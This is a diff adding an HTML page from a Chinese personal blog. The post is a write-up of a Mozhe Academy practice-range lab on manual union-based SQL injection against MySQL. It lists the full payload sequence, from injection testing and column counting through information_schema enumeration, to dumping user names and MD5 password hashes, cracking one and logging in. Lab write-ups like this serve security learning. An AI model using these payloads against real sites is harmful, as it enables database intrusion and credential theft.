@@ -1,0 +1,237 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>墨者学院SQL手工注入漏洞测试(MySQL数据库) | 榴莲酥的碎碎念</title>
+<link rel="shortcut icon" href="https://dengdinshan.github.io/favicon.ico?v=1730519803442">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://dengdinshan.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="墨者学院SQL手工注入漏洞测试(MySQL数据库) | 榴莲酥的碎碎念 - Atom Feed" href="https://dengdinshan.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="墨者学院SQL手工注入漏洞测试(MySQL数据库)
+墨者学院是一个在线靶场
+注册账号之后可以通过支付墨币来进行购买靶场进行使用
+今天来打的是SQL手工注入漏洞测试(MySQL数据库)
+
+首先来到了一个登录系统 不论怎么输入什么账号密码 最后..." />
+    <meta name="keywords" content="靶场" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://dengdinshan.github.io">
+  <img class="avatar" src="https://dengdinshan.github.io/images/avatar.png?v=1730519803442" alt="">
+  </a>
+  <h1 class="site-title">
+    榴莲酥的碎碎念
+  </h1>
+  <p class="site-description">
+    天下有情人终成眷属
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              墨者学院SQL手工注入漏洞测试(MySQL数据库)
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-02
+              </span>
+              <span>
+                3 min read
+              </span>
+              
+                <a href="https://dengdinshan.github.io/tag/ne0Z-hhZT/" class="post-tag">
+                  # 靶场
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="墨者学院sql手工注入漏洞测试mysql数据库">墨者学院SQL手工注入漏洞测试(MySQL数据库)</h1>
+<p>墨者学院是一个在线靶场</p>
+<p>注册账号之后可以通过支付墨币来进行购买靶场进行使用</p>
+<p>今天来打的是SQL手工注入漏洞测试(MySQL数据库)</p>
+<figure data-type="image" tabindex="1"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231143571.png" alt="image-20241023114336418" loading="lazy"></figure>
+<p>首先来到了一个登录系统 不论怎么输入什么账号密码 最后都会出现账号密码错误的弹窗 来查看一下源代码</p>
+<figure data-type="image" tabindex="2"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231158408.png" alt="image-20241023115836342" loading="lazy"></figure>
+<p>发现还有一个链接</p>
+<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231158650.png" alt="image-20241023115855609" style="zoom:150%;" />
+<p>查看原网页</p>
+<figure data-type="image" tabindex="3"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231159290.png" alt="image-20241023115919240" loading="lazy"></figure>
+<p>找到注入点了</p>
+<h2 id="1判断注入点">1.判断注入点</h2>
+<p>开始注入</p>
+<p>http://124.70.64.48:45912/new_list.php?id=1 and 1=1</p>
+<figure data-type="image" tabindex="4"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231201638.png" alt="image-20241023120114587" loading="lazy"></figure>
+<p>http://124.70.64.48:45912/new_list.php?id=1%20and%201=2</p>
+<figure data-type="image" tabindex="5"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231201808.png" alt="image-20241023120136769" loading="lazy"></figure>
+<p>老规矩抛出and 1=1 和 and 1=2测试，发现1=1页面正常，1=2报错了,所以是数字型注入。</p>
+<h2 id="2爆字段个数">2.爆字段个数</h2>
+<p>注入语句为<code>id=1 order by 1</code> 数字1逐次提升发现是5报错。说明字段数为4<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231207879.png" alt="image-20241023120753826" loading="lazy"></p>
+<figure data-type="image" tabindex="6"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231208243.png" alt="image-20241023120828203" loading="lazy"></figure>
+<h2 id="3爆显位位置">3.爆显位位置</h2>
+<figure data-type="image" tabindex="7"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231535290.png" alt="image-20241023153517219" loading="lazy"></figure>
+<p>注入语句为`id=-1 union select 1,2,3,4至于为什么这里id变成-1了，其实是为了让数据库查询不到信息而返回错误，来巧妙返回我们的注入语句。</p>
+<figure data-type="image" tabindex="8"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231535340.png" alt="image-20241023153542302" loading="lazy"></figure>
+<p>发现显位位置是2，3</p>
+<h2 id="4爆数据库名-版本-用户等等">4.爆数据库名、版本、用户等等</h2>
+<p>注入语句为id=-1 union select 1,user(),database(),4<img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231538378.png" alt="image-20241023153825335" loading="lazy"></p>
+<p>得到用户是root，数据库名是mozhe_Discuz_StormGroup</p>
+<h2 id="5爆数据库表名">5.爆数据库表名</h2>
+<p>注入语句为</p>
+<p>id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</p>
+<figure data-type="image" tabindex="9"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231635383.png" alt="image-20241023163507316" loading="lazy"></figure>
+<h2 id="6爆数据库列名">6.爆数据库列名</h2>
+<p>注入语句为</p>
+<p>id=-1 union select 1,group_concat(column_name) ,3,4 from information_schema.columns where table_schema=database() and table_name=&quot;StormGroup_member&quot;</p>
+<figure data-type="image" tabindex="10"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231636348.png" alt="image-20241023163636269" loading="lazy"></figure>
+<p>得到四个列名id,name,password,status</p>
+<p>明显name和password可疑</p>
+<p>7.爆数据库数据</p>
+<p>注入语句为</p>
+<p>id=-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member</p>
+<figure data-type="image" tabindex="11"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231729991.png" alt="image-20241023172917938" loading="lazy"></figure>
+<p>发现密码是一串MD5，去MD5解码网站https://www.cmd5.com/?lailu=www.itdka.cn</p>
+<figure data-type="image" tabindex="12"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231729131.png" alt="image-20241023172952088" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231741559.png" alt="image-20241023173110520" loading="lazy"></figure>
+<p>dsan13  391454</p>
+<p>登录发现第一个失效了</p>
+<figure data-type="image" tabindex="14"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231736294.png" alt="image-20241023173653213" loading="lazy"></figure>
+<p>使用第二个登录成功 拿到key</p>
+<figure data-type="image" tabindex="15"><img src="https://wanan-1327953148.cos.ap-chengdu.myqcloud.com/blog/202410231741105.png" alt="image-20241023174140006" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95mysql%E6%95%B0%E6%8D%AE%E5%BA%93">墨者学院SQL手工注入漏洞测试(MySQL数据库)</a>
+<ul>
+<li><a href="#1%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9">1.判断注入点</a></li>
+<li><a href="#2%E7%88%86%E5%AD%97%E6%AE%B5%E4%B8%AA%E6%95%B0">2.爆字段个数</a></li>
+<li><a href="#3%E7%88%86%E6%98%BE%E4%BD%8D%E4%BD%8D%E7%BD%AE">3.爆显位位置</a></li>
+<li><a href="#4%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-%E7%89%88%E6%9C%AC-%E7%94%A8%E6%88%B7%E7%AD%89%E7%AD%89">4.爆数据库名、版本、用户等等</a></li>
+<li><a href="#5%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D">5.爆数据库表名</a></li>
+<li><a href="#6%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%97%E5%90%8D">6.爆数据库列名</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://dengdinshan.github.io/post/zhi-gong-shan-fang-ying-ji-xiang-ying-ba-ji-xun-lian-web1/">
+              <h3 class="post-title">
+                知攻善防应急响应靶机训练-Web1
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  总访客人数量3496次 本站总访问量7215次
+  <a class="rss" href="https://dengdinshan.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
